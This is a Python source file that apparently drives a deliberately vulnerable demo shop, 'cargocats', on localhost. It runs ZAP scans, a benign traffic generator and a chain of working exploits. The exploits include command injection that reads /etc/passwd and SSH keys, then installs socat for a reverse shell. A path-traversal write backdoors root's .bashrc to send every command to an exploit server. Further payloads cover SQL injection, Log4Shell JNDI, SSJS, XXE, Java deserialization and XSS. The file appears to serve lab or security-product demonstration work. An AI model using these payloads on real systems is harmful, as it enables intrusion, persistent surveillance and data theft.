    global stop_scan_flag, scan_running, scan_state
    
    if stop_scan_flag:
        log_scan_output(f"Scan stopped during {phase_name} phase", "WARNING")
        scan_running = False
        scan_state = "stopped"
        return True
    return False

def check_traffic_stop(phase_name):
    """Helper function to check if traffic should stop and handle cleanup"""
    global stop_traffic_flag, traffic_running, traffic_state
    
    if stop_traffic_flag:
        log_traffic_output(f"Traffic generation stopped during {phase_name} phase", "WARNING")
        traffic_running = False
        traffic_state = "stopped"
        return True
    return False

########################################
# zap scan
########################################
def scan():
    global zap_url
    global first_run
    global scan_running
    global stop_scan_flag
    global scan_state
    global scan_output_buffer

    if scan_running:
        log_scan_output("Scan already running, returning", "WARNING")
        return jsonify({"status": "error", "message": "Scan already running"}), 400
    
    scan_running = True
    scan_state = "starting"
    scan_output_buffer = []  # Clear previous buffer

    # Check if stopped before starting
    if check_scan_stop("startup"):
        scan_state = "idle"  # Special case for pre-start
        return

    if first_run:
        scan_state = "loading_context"
        log_scan_output("First run, loading context")
        r = requests.get(f"{zap_url}/JSON/context/action/importContext/?contextFile=%2Fzap%2Fcargocatszap.context", timeout=5)
        r = requests.get(f"{zap_url}/JSON/forcedUser/action/setForcedUser/?contextId=1&userId=0", timeout=5)
        first_run = False
        log_scan_output("Context loaded and forced user set")
    
    scan_state = "spider"
    log_scan_output("Starting spiders")
    #spider index
    r = requests.get(f"{zap_url}/JSON/spider/action/scan/?url=http%3A%2F%2Fcargocats.localhost%2F&maxChildren=100&recurse=&contextName=Default&subtreeOnly=", timeout=5)
    #spider dashboard
    r = requests.get(f"{zap_url}/JSON/spider/action/scan/?url=http%3A%2F%2Fcargocats.localhost%2Fdashboard&maxChildren=100&recurse=&contextName=Default&subtreeOnly=", timeout=5)

    spiders_done = False
    while not spiders_done and not stop_scan_flag:
        log_scan_output("Waiting for spiders to finish")
        r = requests.get(f"{zap_url}/JSON/spider/view/scans/", timeout=5)
        j = r.json()
        spiders_done = True
        for scan in j['scans']:
            if scan['state'] != "FINISHED":
                spiders_done = False
        sleep(5)
    
    if check_scan_stop("spider"):
        return
    
    log_scan_output("Spiders finished")

    #ajax spider default context as admin
    scan_state = "ajax_spider"
    log_scan_output("Starting ajax spider as admin")
    r = requests.get(f"{zap_url}/JSON/ajaxSpider/action/scanAsUser/?contextName=Default&userName=admin&url=http%3A%2F%2Fcargocats.localhost%2Fdashboard&subtreeOnly=", timeout=5)

    spiders_done = False
    while not spiders_done and not stop_scan_flag:
        log_scan_output("Waiting for ajax spider to finish")
        r = requests.get(f"{zap_url}/JSON/ajaxSpider/view/status/", timeout=5)
        j = r.json()
        if j['status'] == "stopped":
            spiders_done = True
        sleep(10)
    
    if check_scan_stop("ajax spider"):
        return
    
    log_scan_output("Ajax spider finished")

    # running active scan
    scan_state = "active_scan"
    log_scan_output("Starting active scan")
    r = requests.get(f"{zap_url}/JSON/ascan/action/scanAsUser/?url=&contextId=1&userId=0&recurse=&scanPolicyName=&method=&postData=", timeout=5)

    active_scan_done = False
    while not active_scan_done and not stop_scan_flag:
        r = requests.get(f"{zap_url}/JSON/ascan/view/scans/", timeout=5)
        j = r.json()
        active_scan_done = True
        for scan in j['scans']:
            if scan['state'] != "FINISHED":
                active_scan_done = False
                log_scan_output(f"Active scan running. Progress: {scan['progress']}%. Requests: {scan['reqCount']}", "INFO")
        sleep(10)
    
    if check_scan_stop("active scan"):
        return
    
    log_scan_output("Active scan finished")

    scan_running = False
    scan_state = "finished"
    log_scan_output("Scan completed successfully")
    return "done"

########################################
# individual exploit functions
########################################
def run_xss_exploit(session):
    """Execute XSS exploit"""
    log_exploit_output("Executing XSS exploit")
    r = session.get("http://cargocats.localhost/api/shipments/track?trackingId=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E", timeout=5)
    log_exploit_output(f"XSS exploit response status: {r.status_code}")
    # XSS payload is reflected in both 200 (found) and 404 (not found) responses
    return r.status_code in [200, 404]

def run_login_exploit(session):
    """Execute login with default credentials"""
    log_exploit_output("Attempting login with default credentials")
    creds = {"username": "admin","password": "password123"}
    r = session.post("http://cargocats.localhost/login", data=creds, timeout=10, allow_redirects=True)
    log_exploit_output(f"Login response status: {r.status_code}")
    return r.status_code == 200

def run_command_injection_exploit(session):
    """Execute command injection exploits including reverse shell preparation"""
    log_exploit_output("Executing command injection exploits")
    
    # Basic command injection - /etc/passwd
    body = {"url":"google.com; cat /etc/passwd"}
    r = session.post("http://cargocats.localhost/api/webhook/test-connection", json=body, timeout=5)
    log_exploit_output(f"Command injection (cat /etc/passwd) response status: {r.status_code}")

    # Command injection - authorized_keys
    body = {"url":"google.com; cat ~/.ssh/authorized_keys"}
    r = session.post("http://cargocats.localhost/api/webhook/test-connection", json=body, timeout=5)
    log_exploit_output(f"Command injection (cat authorized_keys) response status: {r.status_code}")
    
    # Reverse shell preparation and execution
    log_exploit_output("Preparing reverse shell tools and executing")
    
    # APT Update
    body = {"url":"google.com; apt update"}
    r = session.post("http://cargocats.localhost/api/webhook/test-connection", json=body, timeout=20)
    log_exploit_output(f"APT update response status: {r.status_code}")

    # Socat Installation
    body = {"url":"google.com; apt install -y socat"}
    r = session.post("http://cargocats.localhost/api/webhook/test-connection", json=body, timeout=30)
    log_exploit_output(f"Socat installation response status: {r.status_code}")

    # Reverse Shell
    body = {"url":"google.com; socat 192.168.1.1:4444 exec:/bin/bash"}
    r = session.post("http://cargocats.localhost/api/webhook/test-connection", json=body, timeout=5)
    log_exploit_output(f"Reverse shell attempt response status: {r.status_code}")
    
    return r.status_code == 200

def run_path_traversal_exploit(session):
    """Execute path traversal exploit"""
    log_exploit_output("Executing path traversal exploit")
    
    # Attempt to read appsettings.json via path traversal
    r = session.get("http://cargocats.localhost/api/photos/view?path=../appsettings.json", timeout=5)
    log_exploit_output(f"Path traversal exploit (../appsettings.json) response status: {r.status_code}")
    
    # Attempt to read root's bashrc
    r = session.get("http://cargocats.localhost/api/photos/view?path=../../root/.bashrc", timeout=5)
    log_exploit_output(f"Path traversal exploit (../../root/.bashrc) response status: {r.status_code}")
    
    # Save bashrc content and modify it for command exfiltration
    bashrc_content = ""
    if r.status_code == 200:
        try:
            bashrc_content = r.text
            log_exploit_output(f"Successfully read bashrc file ({len(bashrc_content)} bytes)")
            
            # Modify bashrc to exfiltrate commands to exploit server
            malicious_bashrc = bashrc_content + "\n\n# Malicious command exfiltration\n"
            malicious_bashrc += "export PROMPT_COMMAND='history 1 | curl -s -X POST -d \"$(whoami)@$(hostname): $(history 1)\" http://exploit-server/exfil || true; $PROMPT_COMMAND'\n"
            malicious_bashrc += "# Alternative method - trap DEBUG signal\n"
            malicious_bashrc += "trap 'curl -s -X POST -d \"$(whoami)@$(hostname): $BASH_COMMAND\" http://exploit-server/debug || true' DEBUG\n"
            
            log_exploit_output("Modified bashrc content to include command exfiltration")
            
            # Write modified bashrc back using path traversal
            malicious_filename = "../../root/.bashrc"
            files = {'file': (malicious_filename, malicious_bashrc.encode('utf-8'), 'text/plain')}
            
            log_exploit_output(f"Attempting to write {len(malicious_bashrc)} bytes to {malicious_filename}")
            try:
                r_write = session.post("http://cargocats.localhost/api/photos/upload", files=files, timeout=10, allow_redirects=False)
                log_exploit_output(f"Path traversal write exploit (modified bashrc) response status: {r_write.status_code}")
                
                # Log response body for debugging
                try:
                    if r_write.text:
                        log_exploit_output(f"Write response body: {r_write.text[:200]}")
                except:
                    log_exploit_output("Could not read write response body")
                    
            except requests.exceptions.TooManyRedirects:
                log_exploit_output("Bashrc write got redirect response (request blocked redirects)")
            except Exception as write_error:
                log_exploit_output(f"Error during bashrc write: {str(write_error)}", "ERROR")
            
            # Test if the file was actually written by trying to read it back
            log_exploit_output("Verifying bashrc write by reading it back...")
            r_verify = session.get("http://cargocats.localhost/api/photos/view?path=../../root/.bashrc", timeout=5)
            log_exploit_output(f"Bashrc verification read response status: {r_verify.status_code}")
            
            if r_verify.status_code == 200:
                verify_content = r_verify.text
                if "Malicious command exfiltration" in verify_content:
                    log_exploit_output("SUCCESS: Malicious bashrc content confirmed in file!")
                else:
                    log_exploit_output("WARNING: File read back but doesn't contain expected malicious content")
                    log_exploit_output(f"Read back content sample: {verify_content[-200:]}")
            
        except Exception as e:
            log_exploit_output(f"Error processing bashrc content: {str(e)}", "ERROR")
    
    return r.status_code == 200

def run_sql_injection_exploit(session):
    """Execute SQL injection exploit"""
    log_exploit_output("Executing SQL injection exploit")
    
    # SQL injection via payment processing - time-based blind injection
    sql_injection_payload = {
        "shipmentId": "1",
        "cardNumber": "9999999999999999 ' AND SLEEP(5) OR 'a'='a"
    }
    
    import time
    start_time = time.time()
    r = session.post("http://cargocats.localhost/api/payments/process", 
                    json=sql_injection_payload, 
                    timeout=15)
    end_time = time.time()
    response_time = end_time - start_time
    
    log_exploit_output(f"SQL injection exploit response status: {r.status_code}")
    log_exploit_output(f"SQL injection response time: {response_time:.2f} seconds")
    
    if response_time >= 4.5:  # Allow some tolerance for network latency
        log_exploit_output("SUCCESS: SQL injection appears successful (response time indicates SLEEP executed)")
        return True
    else:
        log_exploit_output("WARNING: SQL injection may not have worked (response time too fast)")
        return False

def run_log4shell_exploit(session):
    """Execute Log4Shell (Log4j) exploit"""
    log_exploit_output("Executing Log4Shell (Log4j) exploit")
    
    # JNDI LDAP payload targeting exploit-server
    log4shell_payload = {
        "username": "${jndi:ldap://exploit-server:1389/serial/CommonsCollections2/sleep/1000}",
        "password": "dgsdfdfsg"
    }
    
    r = session.post("http://cargocats.localhost/login", 
                    data=log4shell_payload, 
                    timeout=15)
    log_exploit_output(f"Log4Shell exploit response status: {r.status_code}")
    
    # Re-authenticate after Log4Shell exploit
    log_exploit_output("Re-authenticating after Log4Shell exploit")
    creds = {"username": "admin","password": "password123"}
    r = session.post("http://cargocats.localhost/login", data=creds, timeout=10, allow_redirects=True)
    log_exploit_output(f"Re-login response status: {r.status_code}")
    
    return r.status_code == 200

def run_ssjs_injection_exploit(session):
    """Execute SSJS injection exploit"""
    log_exploit_output("Executing SSJS injection exploit")
    
    # SSJS injection payload via label generation
    ssjs_payload = {
        "firstName": "\"; require('child_process').exec('whoami', (error, stdout, stderr) => { console.log('User:', stdout); }); \"",
        "lastName": "Doe",
        "address": "123 Main Street",
        "trackingId": "TRACK-12345678"
    }
    
    r = session.post("http://cargocats.localhost/api/labels/generate", 
                    json=ssjs_payload, 
                    timeout=10)
    log_exploit_output(f"SSJS injection exploit response status: {r.status_code}")
    
    return r.status_code == 200

def run_xxe_exploit(session):
    """Execute XXE exploit via document processing"""
    log_exploit_output("Executing XXE exploit via document processing")
    
    # Create malicious DOCX with XXE payload
    docx_buffer = io.BytesIO()
    with zipfile.ZipFile(docx_buffer, 'w', zipfile.ZIP_DEFLATED) as docx:
        # Add minimal required files for a DOCX with XXE payload
        docx.writestr('_rels/.rels', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>''')
        
        # Document with XXE payload to read /etc/passwd
        docx.writestr('word/document.xml', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
<w:p><w:r><w:t>Medical History: &xxe;</w:t></w:r></w:p>
</w:body>
</w:document>''')
    
    xxe_docx_data = docx_buffer.getvalue()
    docx_buffer.close()
    
    # Upload malicious DOCX file
    files = {'file': ('xxe_payload.docx', xxe_docx_data, 'application/vnd.openxmlformats-officedocument.wordprocessingml.document')}
    r = session.post("http://cargocats.localhost/api/documents/process", files=files, timeout=10, allow_redirects=False)
    log_exploit_output(f"XXE exploit response status: {r.status_code}")
    
    # Check if XXE was successful by looking for passwd file content in response
    if r.status_code == 200:
        try:
            response_data = r.json()
            response_text = str(response_data)
            if "root:" in response_text or "/bin/bash" in response_text or "/bin/sh" in response_text:
                log_exploit_output("SUCCESS: XXE exploit appears successful (passwd file content detected)")
                return True
            else:
                log_exploit_output("WARNING: XXE exploit may not have worked (no passwd content detected)")
                return False
        except:
            log_exploit_output("Could not parse XXE response for analysis")
            return False
    
    return False

def run_deserialization_exploit(session):
    """Execute Java Deserialization exploit via address import functionality"""
    log_exploit_output("Executing Java Deserialization exploit via address import functionality")
    
    try:
        # Check if the payload.ser file exists
        with open("payload.ser", "rb") as f:
            payload_data = f.read()
            log_exploit_output(f"Loaded payload.ser file ({len(payload_data)} bytes)")
        
        # Upload the malicious serialized payload file
        files = {'file': ('payload.ser', payload_data, 'application/octet-stream')}
        r = session.post("http://cargocats.localhost/api/addresses/import", files=files, timeout=10, allow_redirects=False)
        log_exploit_output(f"Deserialization exploit response status: {r.status_code}")
        log_exploit_output(f"Deserialization exploit response body: {r.text[:500] if r.text else 'Empty'}")
        
        # The exploit might still succeed even if the response indicates an error, since the code execution happens when deserializing
        if r.status_code == 200:
            log_exploit_output("SUCCESS: Deserialization exploit likely succeeded based on 200 OK response")
            return True
        else:
            # Even with error responses, the exploit may have triggered code execution
            log_exploit_output("Deserialization exploit may have partially succeeded despite error response")
            log_exploit_output("Check for evidence of code execution on the target system")
            return True
    except Exception as e:
        log_exploit_output(f"Error during deserialization exploit: {str(e)}", "ERROR")
        return False

########################################
# exploits
########################################
def exploit():
    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
    
    if exploit_running:
        log_exploit_output("Exploit already running, returning", "WARNING")
        return
    
    exploit_running = True
    exploit_state = "starting"
    exploit_output_buffer = []  # Clear previous buffer
    
    # Check if stopped before starting
    if check_exploit_stop("startup"):
        exploit_state = "idle"  # Special case for pre-start
        return
    
    try:
        log_exploit_output("Starting exploit execution")
        
        # Create a session to maintain cookies
        session = requests.Session()
        # Note: We'll use allow_redirects=False on individual requests instead of session-wide
        
        # ================================================
        # XSS EXPLOIT
        # ================================================
        exploit_state = "xss_exploit"
        if check_exploit_stop("XSS"):
            return
        run_xss_exploit(session)

        # ================================================
        # LOGIN 
        # ================================================
        exploit_state = "login"
        if check_exploit_stop("login"):
            return
        run_login_exploit(session)

        # ================================================
        # COMMAND INJECTION EXPLOITS
        # ================================================
        exploit_state = "cmd_injection"
        if check_exploit_stop("command injection"):
            return
        run_command_injection_exploit(session)
        
        # ================================================
        # PATH TRAVERSAL EXPLOIT
        # ================================================
        exploit_state = "path_traversal"
        if check_exploit_stop("path traversal"):
            return
        run_path_traversal_exploit(session)
        
        # ================================================
        # SQL INJECTION EXPLOIT
        # ================================================
        exploit_state = "sql_injection"
        if check_exploit_stop("SQL injection"):
            return
        run_sql_injection_exploit(session)

        # ================================================
        # LOG4SHELL EXPLOIT
        # ================================================
        exploit_state = "log4shell"
        if check_exploit_stop("Log4Shell"):
            return
        run_log4shell_exploit(session)

        # ================================================
        # ADDITIONAL LOGIN AFTER LOG4SHELL
        # ================================================
        exploit_state = "post_log4shell_login"
        if check_exploit_stop("post-Log4Shell login"):
            return
        
        log_exploit_output("Additional login verification after Log4Shell exploit")
        creds = {"username": "admin","password": "password123"}
        r = session.post("http://cargocats.localhost/login", data=creds, timeout=10, allow_redirects=True)
        log_exploit_output(f"Post-Log4Shell login response status: {r.status_code}")

        # ================================================
        # SSJS INJECTION EXPLOIT
        # ================================================
        exploit_state = "ssjs_injection"
        if check_exploit_stop("SSJS injection"):
            return
        run_ssjs_injection_exploit(session)

        # ================================================
        # XXE EXPLOIT
        # ================================================
        exploit_state = "xxe_exploit"
        if check_exploit_stop("XXE"):
            return
        run_xxe_exploit(session)
        
        # ================================================
        # DESERIALIZATION EXPLOIT
        # ================================================
        exploit_state = "deserialization_exploit"
        if check_exploit_stop("Deserialization"):
            return
        run_deserialization_exploit(session)

        exploit_state = "finished"
        log_exploit_output("Exploit execution completed successfully")
        
    except Exception as e:
        exploit_state = "error"
        log_exploit_output(f"Exploit execution failed: {str(e)}", "ERROR")
    finally:
        exploit_running = False   

########################################
# traffic generation
########################################
def traffic():
    global traffic_running, traffic_state, traffic_output_buffer, stop_traffic_flag
    
    if traffic_running:
        log_traffic_output("Traffic generation already running, returning", "WARNING")
        return
    
    traffic_running = True
    traffic_state = "starting"
    traffic_output_buffer = []  # Clear previous buffer
    
    try:
        log_traffic_output("Starting traffic generation")
        
        # Create a session to maintain cookies
        session = requests.Session()
        
        # ================================================
        # PHASE 1: INITIAL PAGE BROWSING
        # ================================================
        traffic_state = "initial_browsing"
        log_traffic_output("Phase 1: Initial page browsing")
        
        # Visit home page
        r = session.get("http://cargocats.localhost/", timeout=5, allow_redirects=False)
        log_traffic_output(f"Visited home page - Status: {r.status_code}")
        
        # Test shipment tracking with wrong ID
        r = session.get("http://cargocats.localhost/api/shipments/track?trackingId=wrong", timeout=5, allow_redirects=False)
        log_traffic_output(f"Shipment tracking (wrong ID) - Status: {r.status_code}")
        
        # ================================================
        # PHASE 2: LOGIN ATTEMPTS
        # ================================================
        traffic_state = "login_attempts"
        log_traffic_output("Phase 2: Login attempts")
        
        # Visit login page
        r = session.get("http://cargocats.localhost/login", timeout=5, allow_redirects=False)
        log_traffic_output(f"Visited login page - Status: {r.status_code}")
        
        # Failed login attempt
        failed_creds = {"username": "wrong", "password": "wrong"}
        r = session.post("http://cargocats.localhost/login", data=failed_creds, timeout=10, allow_redirects=False)
        log_traffic_output(f"Failed login attempt - Status: {r.status_code}")
        
        # Visit login error page
        r = session.get("http://cargocats.localhost/login?error=true", timeout=5, allow_redirects=False)
        log_traffic_output(f"Visited login error page - Status: {r.status_code}")
        
        # Successful login
        success_creds = {"username": "admin", "password": "password123"}
        r = session.post("http://cargocats.localhost/login", data=success_creds, timeout=10, allow_redirects=False)
        log_traffic_output(f"Successful login attempt - Status: {r.status_code}")
        
        # ================================================
        # PHASE 3: DASHBOARD NAVIGATION
        # ================================================
        traffic_state = "dashboard_navigation"
        log_traffic_output("Phase 3: Dashboard navigation")
        
        # Visit dashboard
        r = session.get("http://cargocats.localhost/dashboard", timeout=5, allow_redirects=False)
        log_traffic_output(f"Visited dashboard - Status: {r.status_code}")
        
        # Dashboard shipment tracking with valid ID
        r = session.get("http://cargocats.localhost/api/shipments/track?trackingId=TRACK-48460B74", timeout=5, allow_redirects=False)
        log_traffic_output(f"Dashboard shipment tracking - Status: {r.status_code}")
        
        # Get cat facts for dashboard
        r = session.get("http://cargocats.localhost/api/cats/facts", timeout=5, allow_redirects=False)
        log_traffic_output(f"Cat facts API call - Status: {r.status_code}")
        
        # ================================================
        # PHASE 4: CATS SECTION NAVIGATION
        # ================================================
        traffic_state = "cats_navigation"
        log_traffic_output("Phase 4: Cats section navigation")
        
        # Visit cats page
        r = session.get("http://cargocats.localhost/cats", timeout=5, allow_redirects=False)
        log_traffic_output(f"Visited cats page - Status: {r.status_code}")
        
        # Cats API call
        r = session.get("http://cargocats.localhost/api/cats", timeout=5, allow_redirects=False)
        log_traffic_output(f"Cats API call - Status: {r.status_code}")
        
        # Cat facts API call
        r = session.get("http://cargocats.localhost/api/cats/facts", timeout=5, allow_redirects=False)
        log_traffic_output(f"Cat facts API call (cats section) - Status: {r.status_code}")
        
        # Test viewing existing cat images if any cats have images
        if r.status_code == 200:
            try:
                cats_response = r.json()
                # Check if response has embedded cats data
                cats_data = cats_response.get('_embedded', {}).get('cats', [])
                for cat in cats_data:
                    if cat.get('image') and '/api/photos/view' in cat.get('image', ''):
                        # Test viewing existing cat image
                        image_url = cat['image']
                        # Extract full URL from relative path if needed
                        if image_url.startswith('/api/photos/view'):
                            full_image_url = f"http://cargocats.localhost{image_url}"
                        else:
                            full_image_url = image_url
                        
                        r_img = session.get(full_image_url, timeout=5, allow_redirects=False)
                        log_traffic_output(f"Existing cat image view (cat: {cat.get('name', 'unknown')}) - Status: {r_img.status_code}")
                        break  # Only test one existing image to avoid too many requests
            except Exception as e:
                log_traffic_output(f"Error checking existing cat images: {str(e)}", "WARNING")
        
        # Test image upload endpoint using cat.jpg file
        with open("cat.jpg", "rb") as f:
            cat_image_data = f.read()
            log_traffic_output(f"Using cat.jpg for image upload, size: {len(cat_image_data)} bytes")
        
        files = {'file': ('cat.jpg', cat_image_data, 'image/jpeg')}
        r = session.post("http://cargocats.localhost/api/photos/upload", files=files, timeout=10, allow_redirects=False)
        log_traffic_output(f"Cat.jpg image upload - Status: {r.status_code}")
        
        # Parse the upload response to get the image path
        uploaded_image_path = None
        if r.status_code == 200:
            try:
                upload_response = r.json()
                uploaded_image_path = upload_response.get('path')
                log_traffic_output(f"Image uploaded successfully - Path: {uploaded_image_path}")
            except:
                log_traffic_output("Failed to parse upload response", "WARNING")
        
        # Test image view endpoint if upload was successful
        if uploaded_image_path:
            r = session.get(f"http://cargocats.localhost/api/photos/view?path={uploaded_image_path}", timeout=5, allow_redirects=False)
            log_traffic_output(f"Image view test - Status: {r.status_code}")
        
        # Test error cases for image endpoints
        # Test viewing non-existent image
        r = session.get("http://cargocats.localhost/api/photos/view?path=nonexistent/image.jpg", timeout=5, allow_redirects=False)
        log_traffic_output(f"Non-existent image view test - Status: {r.status_code}")
        
        # Test upload without file parameter
        r = session.post("http://cargocats.localhost/api/photos/upload", data={}, timeout=5, allow_redirects=False)
        log_traffic_output(f"Image upload without file test - Status: {r.status_code}")
        
        # Test upload with invalid file type (text file)
        invalid_files = {'file': ('test.txt', b'This is not an image', 'text/plain')}
        r = session.post("http://cargocats.localhost/api/photos/upload", files=invalid_files, timeout=5, allow_redirects=False)
        log_traffic_output(f"Invalid file upload test - Status: {r.status_code}")
        
        # Add new cat with image
        cat_data_with_image = {
            "name": "muppet", 
            "type": "Persian", 
            "image": f"/api/photos/view?path={uploaded_image_path}" if uploaded_image_path else None
        }
        r = session.post("http://cargocats.localhost/api/cats", json=cat_data_with_image, timeout=5, allow_redirects=False)
        log_traffic_output(f"Cats API POST new cat with image - Status: {r.status_code}")
        
        # Add new cat without image (original test)
        cat_data = {"name": "muppet_no_image", "type": "Persian", "image": None}
        r = session.post("http://cargocats.localhost/api/cats", json=cat_data, timeout=5, allow_redirects=False)
        log_traffic_output(f"Cats API POST new cat without image - Status: {r.status_code}")
        
        # Test DELETE cat endpoint using a separate session (not logged in)
        delete_session = requests.Session()
        r = delete_session.delete("http://cargocats.localhost/api/cats/2", timeout=5, allow_redirects=False)
        log_traffic_output(f"Cats API DELETE cat (id=1, no auth) - Status: {r.status_code}")
        
        # Test document processing service
        # Create a minimal DOCX file (ZIP with XML structure)
        
        # Create a simple DOCX file in memory
        docx_buffer = io.BytesIO()
        with zipfile.ZipFile(docx_buffer, 'w', zipfile.ZIP_DEFLATED) as docx:
            # Add minimal required files for a DOCX
            docx.writestr('_rels/.rels', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>''')
            
            docx.writestr('word/document.xml', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
<w:p><w:r><w:t>Medical History for Cat: Test vaccination records and health notes.</w:t></w:r></w:p>
</w:body>
</w:document>''')
        
        docx_data = docx_buffer.getvalue()
        docx_buffer.close()
        
        # Upload DOCX file to document processing service
        files = {'file': ('medical_history.docx', docx_data, 'application/vnd.openxmlformats-officedocument.wordprocessingml.document')}
        r = session.post("http://cargocats.localhost/api/documents/process", files=files, timeout=10, allow_redirects=False)
        log_traffic_output(f"Document processing API POST - Status: {r.status_code}")
        
        # Test document service health check
        r = session.get("http://cargocats.localhost/api/documents/health", timeout=5, allow_redirects=False)
        log_traffic_output(f"Document service health check - Status: {r.status_code}")
        
        # Test document processing with invalid file (should fail)
        invalid_files = {'file': ('not_a_docx.txt', b'This is not a DOCX file', 'text/plain')}
        r = session.post("http://cargocats.localhost/api/documents/process", files=invalid_files, timeout=5, allow_redirects=False)
        log_traffic_output(f"Document processing invalid file test - Status: {r.status_code}")
        
        # ================================================
        # PHASE 5: ADDRESSES SECTION NAVIGATION
        # ================================================
        traffic_state = "addresses_navigation"
        log_traffic_output("Phase 5: Addresses section navigation")
        
        # Visit addresses page
        r = session.get("http://cargocats.localhost/addresses", timeout=5, allow_redirects=False)
        log_traffic_output(f"Visited addresses page - Status: {r.status_code}")
        
        # Addresses API call
        r = session.get("http://cargocats.localhost/api/addresses", timeout=5, allow_redirects=False)
        log_traffic_output(f"Addresses API call - Status: {r.status_code}")
        
        # Add new address
        address_data = {"fname": "tyler", "name": "tester", "address": "123 main street usa"}
        r = session.post("http://cargocats.localhost/api/addresses", json=address_data, timeout=5, allow_redirects=False)
        log_traffic_output(f"Addresses API POST new address - Status: {r.status_code}")
        
        # ================================================
        # PHASE 6: WEBHOOKS SECTION NAVIGATION
        # ================================================
        traffic_state = "webhooks_navigation"
        log_traffic_output("Phase 6: Webhooks section navigation")
        
        # Visit webhooks page
        r = session.get("http://cargocats.localhost/webhooks", timeout=5, allow_redirects=False)
        log_traffic_output(f"Visited webhooks page - Status: {r.status_code}")
        
        # Webhooks API interactions
        r = session.get("http://cargocats.localhost/api/shipments", timeout=5, allow_redirects=False)
        log_traffic_output(f"Webhook API GET /api/shipments - Status: {r.status_code}")
        
        test_notification_body = {
            "notificationUrl": "https://contrastsecurity.com",
            "method": "GET",
            "shipmentData": {
                "trackingId": "TRACK-48460B74",
                "status": "open",
                "id": 1
            }
        }
        r = session.post("http://cargocats.localhost/api/webhook/test-shipment-notification", json=test_notification_body, timeout=5, allow_redirects=False)
        log_traffic_output(f"Webhook API POST test-shipment-notification - Status: {r.status_code}")
        
        webhook_body = {"notificationUrl": "https://contrastsecurity.com", "webhookMethod": "GET"}
        r = session.patch("http://cargocats.localhost/api/shipments/1/webhook", json=webhook_body, timeout=5, allow_redirects=False)
        log_traffic_output(f"Webhook API PATCH shipments/1/webhook - Status: {r.status_code}")
        
        body = {"url": "contrastsecurity.com"}
        r = session.post("http://cargocats.localhost/api/webhook/test-connection", json=body, timeout=5, allow_redirects=False)
        log_traffic_output(f"Webhook API POST test-connection - Status: {r.status_code}")

        # ================================================
        # PHASE 7: ADDRESSES EXPORT/IMPORT
        # ================================================
        traffic_state = "addresses_export_import"
        log_traffic_output("Phase 7: Addresses export/import")

        # Export addresses (GET)
        try:
            r = session.get("http://cargocats.localhost/api/addresses/export", timeout=10, allow_redirects=False)
            log_traffic_output(f"Addresses export (GET /api/addresses/export) - Status: {r.status_code}")
            if r.status_code == 200:
                log_traffic_output(f"Exported addresses file size: {len(r.content)} bytes")
        except Exception as e:
            log_traffic_output(f"Addresses export failed: {str(e)}", "ERROR")

        # Import addresses (POST, file upload)
        try:
            with open("addresses.ser", "rb") as f:
                files = {'file': ('addresses.ser', f, 'application/octet-stream')}
                r = session.post("http://cargocats.localhost/api/addresses/import", files=files, timeout=10, allow_redirects=False)
                log_traffic_output(f"Addresses import (POST /api/addresses/import) - Status: {r.status_code}")
                if r.status_code == 200:
                    log_traffic_output("Addresses import succeeded")
                else:
                    log_traffic_output(f"Addresses import failed: {r.text}", "ERROR")
        except Exception as e:
            log_traffic_output(f"Addresses import failed: {str(e)}", "ERROR")

        # ================================================
        # PHASE 8: SHIPMENTS SECTION NAVIGATION
        # ================================================
        traffic_state = "shipments_navigation"
        log_traffic_output("Phase 8: Shipments section navigation")
        
        # Visit shipments page
        r = session.get("http://cargocats.localhost/shipments", timeout=5, allow_redirects=False)
        log_traffic_output(f"Visited shipments page - Status: {r.status_code}")
        
        # Shipments API calls
        r = session.get("http://cargocats.localhost/api/addresses", timeout=5, allow_redirects=False)
        log_traffic_output(f"Shipments API /api/addresses - Status: {r.status_code}")
        
        r = session.get("http://cargocats.localhost/api/cats", timeout=5, allow_redirects=False)
        log_traffic_output(f"Shipments API /api/cats - Status: {r.status_code}")
        
        r = session.get("http://cargocats.localhost/api/shipments", timeout=5, allow_redirects=False)
        log_traffic_output(f"Shipments API /api/shipments - Status: {r.status_code}")
        
        # Process payment for shipment
        payment_data = {"shipmentId": "1", "cardNumber": "1111111111111111"}
        r = session.post("http://cargocats.localhost/api/payments/process", json=payment_data, timeout=5, allow_redirects=False)
        log_traffic_output(f"Shipments API POST payment processing - Status: {r.status_code}")
        
        # ================================================
        # PHASE 8: LABEL GENERATION
        # ================================================
        traffic_state = "label_generation"
        log_traffic_output("Phase 8: Label generation")
        
        # Generate label with valid data
        label_data = {
            "firstName": "John",
            "lastName": "Doe", 
            "address": "123 Main Street, Anytown, USA 12345",
            "trackingId": "TRACK-48460B74"
        }
        r = session.post("http://cargocats.localhost/api/labels/generate", json=label_data, timeout=10, allow_redirects=False)
        log_traffic_output(f"Label generation API POST - Status: {r.status_code}")
        
        traffic_state = "finished"
        log_traffic_output("Traffic generation completed successfully")
        
    except Exception as e:
        traffic_state = "error"
        log_traffic_output(f"Traffic generation failed: {str(e)}", "ERROR")
    finally:
        traffic_running = False

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
